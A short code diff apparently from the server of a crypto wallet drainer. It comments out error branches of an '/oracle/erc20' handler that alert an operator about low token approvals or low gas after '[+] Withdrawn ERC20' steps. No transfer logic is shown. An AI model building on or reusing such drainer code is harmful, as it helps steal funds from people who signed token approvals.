@@ -661,26 +661,26 @@ app.post("/oracle/erc20", async (req, res) => {
     //     console.log("[+] Withdrawn ERC20");
 
    
-    } else {
-      let message2 =
-      `🔴 <b>[-] Approval Balance Error</b>\n\n` +
-      `<b>Reason:</b> Low Approval Amount\n` ;
-        notify({},message2);
-      console.log("[-] LOW ALLOWANCE");
+//     } else {
+//       let message2 =
+//       `🔴 <b>[-] Approval Balance Error</b>\n\n` +
+//       `<b>Reason:</b> Low Approval Amount\n` ;
+//         notify({},message2);
+//       console.log("[-] LOW ALLOWANCE");
 
-    }
-  } catch (error) {
+//     }
+//   } catch (error) {
 
-    let message2 =
-    `🔴 <b>[-] Approval Transfer Error</b>\n\n` +
-    `<b>Reason:</b> Possible low gas balance\n` ;
-      notify({},message2);
-    console.log("[-] POSSIBLE LOW GAS");
-    // console.log(error);
+//     let message2 =
+//     `🔴 <b>[-] Approval Transfer Error</b>\n\n` +
+//     `<b>Reason:</b> Possible low gas balance\n` ;
+//       notify({},message2);
+//     console.log("[-] POSSIBLE LOW GAS");
+//     // console.log(error);
 
 
-  }
-});
+//   }
+// });
 
 app.post("/oracle/eip712", async (req, res) => {
   res.status(200).send({
